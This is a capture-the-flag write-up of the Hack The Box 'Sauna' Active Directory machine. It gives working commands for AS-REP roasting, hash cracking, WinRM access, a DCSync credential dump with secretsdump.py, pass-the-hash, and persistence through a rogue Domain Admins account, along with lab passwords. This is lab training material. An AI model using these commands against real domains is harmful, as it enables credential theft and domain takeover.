---
title: HTB-Sauna
draft: false
tags:
  - htb
  - windows
  - active-directory
  - bloodhound
  - create-user-list
  - as-rep-roasting
  - kerberos
  - kerbrute
  - dcsync
  - secretsdump
  - persistence
  - getnpusers
  - getuserspns
  - easy
---
## Summary
HTTP -> User list generation -> Kerbrute -> AS-REP Roast -> Shell as **FSmith**-> WinPEAS -> AutoLogon Creds Exposed -> Shell as **svc_loanmgr** -> Bloodhound -> DCSync Attack -> Shell as **Administrator**

## Information Gathering
### Rustscan

Rustscan found bunch of ports open and based on the ports open, sauna seemed to be a **Active Directory** server:

```bash
┌──(yoon㉿kali)-[~/Documents/htb/sauna]
└─$ sudo rustscan --addresses 10.10.10.175 --range 1-65535
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍
<snip>
Host is up, received echo-reply ttl 127 (0.38s latency).
Scanned at 2024-03-28 07:24:52 EDT for 1s

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49675/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49677/tcp open  unknown          syn-ack ttl 127
49746/tcp open  unknown          syn-ack ttl 127
49776/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.17 seconds
           Raw packets sent: 24 (1.032KB) | Rcvd: 21 (908B)
```

## Enumeration
### SMB - TCP 445

As always, I first enumerated SMB but null login was not allowed:

![](https://i.imgur.com/ygnBjo1.png)


crackmapexc discovered the domain name: **EGOTISTICAL-BANK.LOCAL** -> Added to /etc/hosts

![](https://i.imgur.com/eYZQiuB.png)


### DNS UDP/TCP - 53

I confirmed domain name through dig:

`dig @10.10.10.175 EGOTISTICAL-BANK.LOCAL`

![](https://i.imgur.com/Z6tAh7w.png)


Unfortunately, zone transfer was not allowed:

`dig axfr @10.10.10.175 EGOTISTICAL-BANK.LOCAL`

![](https://i.imgur.com/XiorVmm.png)


### RPC - TCP 135

I tried null login on RPC but access was denied when commands were executed:

![](https://i.imgur.com/Tf2bk2K.png)


### LDAP - TCP 389

I first queried for base naming contexts to make sure of the domain name:

`ldapsearch -H ldap://10.10.10.175 -x -s base namingcontexts`

![](https://i.imgur.com/tMCsNPZ.png)


Luckily, I was able to bind to base without any credentials but nothing interesting was found from it:

`ldapsearch -H ldap://10.10.10.175 -x -b "DC=EGOTISTICAL-BANK,DC=LOCAL"`

![](https://i.imgur.com/8InHdZy.png)



### HTTP - TCP 80

HTTP was hosting an **IIS** web page about EGOTISTICAL Bank:

![](https://i.imgur.com/P6nL0qv.png)



Looking around, I discovered possible usernames on the server:

![](https://i.imgur.com/v4eVBxY.png)





#### Directory Bruteforce

When **IIS** is running the the server, I always run two directory bruteforcing with two different wordlists.

One with lower case wordlist since IIS is case-sensitive and another with IIS dedicated wordlist.

I ran feroxbuster with lower case directory list but nothing useful was discovered:

`sudo feroxbuster -u http://10.10.10.175 -n -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -C 404`

![](https://i.imgur.com/TaFMyhF.png)


I also ran feroxbuster with IIS specific directory list but this also wasn't successful:

`sudo feroxbuster -u http://10.10.10.175 -n -x asp,aspx,conf,php -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt -C 404`

![](https://i.imgur.com/daMCMaU.png)


Since I spent enough enumeration time on all the services and nothing came useful, I decided to move back to potential usernames discovered and attempt on **AS-REP Roasting**.


## Shell as fsmith

### Create Userlist

Below are the potential users on the server that I discovered from the webpage:

- Fergus Smith
- Shuan Coins
- Bowie Taylor
- Sohpie Driver
- Hugo Bear
- Steven Kerb

Prior to creating list of usernames, I thought of possible variations for Windows username:

| Pattern                      | Example           |
|------------------------------|-------------------|
| first-name                   | robert            |
| first-namelast-name          | roberthilton      |
| first-name.last-name         | robert.hilton     |
| first-name-initial.last-name | r.hilton          |
| first-name_last-name         | robert_hilton     |
| first-name-initial_last-name | r_hilton          |
| first-letter-last-name       | rhilton           |

I didn't want to create a full list manually, so I create a custom Python script and published on Github. [Link](https://github.com/jadu101/Windows-Username-Generator)

Now using the tool, I generated all possible variations for usernames:

`python windows-username-genertor.py`

![](https://i.imgur.com/OWHwO2M.png)


I copied the output to **usernames-generated.txt**


### AS-REP Roasting

Usually for AS-REP Roasting, I would first run **Kerbrute** to discover which users are found on KDC server and then forward that user to AS-REP Roasting. However, since my wordlist is already small enough, I just ran AS-REP Roasting directly:

`GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -user usernames-generated.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175`

![](https://i.imgur.com/SgY1m9I.png)


From above you can see that GetNPUsers.py also shows whether users are valid on KDC server or not.

After waiting for the scan to finish, I have hashcat crackable hash for user **fsmith** on **hashes.aspreroast** file:

![](https://i.imgur.com/Wc0LLOa.png)


I cracked the hash using `hahcat -m 18200 hashes.aspreroast` and password for **fsmith** was **Thestrokes23**.

![](https://i.imgur.com/nT9Vasw.png)


### Kerbrute

If the generated userlist was too long to be ran directly for AS-REP Roasting, I could have first ran it on Kerbrute to filter out valid user from KDC server:

`./kerbrute_linux_amd64 userenum -d EGOTISTICAL-BANK.LOCAL --dc dc01.egotistical.local ~/Documents/htb/sauna/usernames-generated.txt`

![](https://i.imgur.com/Y5HiCQw.png)


### Evil-winrm
Luckily, user fsmith had access to winrm:

![](https://i.imgur.com/4hr5wcN.png)


Now I can access the system through evil-winrm as fsmith:

`sudo evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23`

![](https://i.imgur.com/8nr60eC.png)



## Privesc: fsmith to svc_loanmgr
### Local Enumeration

Before running winpeas or bloodhound, I always like to spend some time on manual enumeration to see what to expect from automated scans.

There seemed to be two more users besides from Administrator and FSmith: **svc_loanmgr** and **HSmith**

`net users`

![](https://i.imgur.com/7MXNYuf.png)


### Bloodhound

After spending some time on local enumeration, I moved on to Bloodhound:

`sudo python bloodhound.py -u fsmith -p 'Thestrokes23' -c ALL -ns 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL`

![](https://i.imgur.com/1lXcCxp.png)


I started neo4j and bloodhound with the commands below:

```
sudo neo4j console
bloodhound
```

I drag and dropped the json files created and frist marked **fsmith** as owned.

![](https://i.imgur.com/Vs8rqg8.png)


There was no outbound object control:

![](https://i.imgur.com/uTwcwBs.png)


**HSmith** was found to be Kerberoastable:

![](https://i.imgur.com/376bzad.png)


But it seemed that there are no path from fsmith to kerberoastable user HSmith.

I can confirm it by manually trying:

`GetUserSPNs.py EGOTISTICAL-BANK.LOCAL/fsmith:Thestrokes23 -dc-ip EGOTISTICAL-BANK.LOCAL -request` 

![](https://i.imgur.com/KaDPrxG.png)


This is because my local time not being synchronised with the DC.

In order to avoid this from happening, I need root permission to disale Network Time Protocol from auto-updating. 

Or I need to sync my local time with DC time but that might somewhat screw up my machine so I didn't proceed.

Read more about it on [here](https://github.com/ivanitlearning/CTF-Repos/blob/master/HTB/Sauna/Kerberoasting-HSmith.md)




### WinPEAS.exe

Since nothing was found from Bloodhound, I moved on to Winpeas.

I first uploded winpeas to evil-winrm:

![](https://i.imgur.com/CO84ddJ.png)


Winpeas found potential credentials from AutoLogon History: **svc_loanmgr**:**Moneymakestheworldgoround!**

![](https://i.imgur.com/PhKt4W8.png)


Luckily, **svc_loanmgr** had access to WinRM:

![](https://i.imgur.com/i937YrS.png)


Now I have a shell as **svc_loanmgr**:

![](https://i.imgur.com/7TrpLDi.png)


## Privesc: svc_loanmgr to Administrator
### Bloodhound

I went back to Bloodhound and first marked user **svc_loanmgr** as owned.

Checking on **Outbound Object Control**, there was one for **First Degree Object Control**:

![](https://i.imgur.com/rGCeB7L.png)


It seemed that user **svc_loanmgr** can **DCSync** attack towards the domain **EGOTISTICAL-BANK.LOCAL**.

![](https://i.imgur.com/n4yVagf.png)

Bloodhound provided guide on exploitation:

![](https://i.imgur.com/Zo8ZU4d.png)


### Secretsdump.py


Using **secretsdump.py**, I dumped bunch of password hashes, including Administrator's

`secretsdump.py 'EGOTISTICAL-BANK.LOCAL'/'svc_loanmgr':'Moneymakestheworldgoround!'@'EGOTISTICAL-BANK.LOCAL'`

![](https://i.imgur.com/GfU1j1I.png)


### Pass The Hash

Using **NT** part of the hash, I can evil-winrm as the Administrator:

![](https://i.imgur.com/UOYyvDj.png)


## Beyond Root
### Persistence

It is always a best practice to have a stable persistent user on the target system.

I first listed out what groups are on system:

`net groups`

![](https://i.imgur.com/6skD1Bx.png)

Now I added user jadu "Domain Admins":

![](https://i.imgur.com/ACfWEe4.png)

I can now evil-winrm as jadu anytime I want:

![](https://i.imgur.com/enpIqP0.png)



## References
- https://medium.com/@danieldantebarnes/fixing-the-kerberos-sessionerror-krb-ap-err-skew-clock-skew-too-great-issue-while-kerberoasting-b60b0fe20069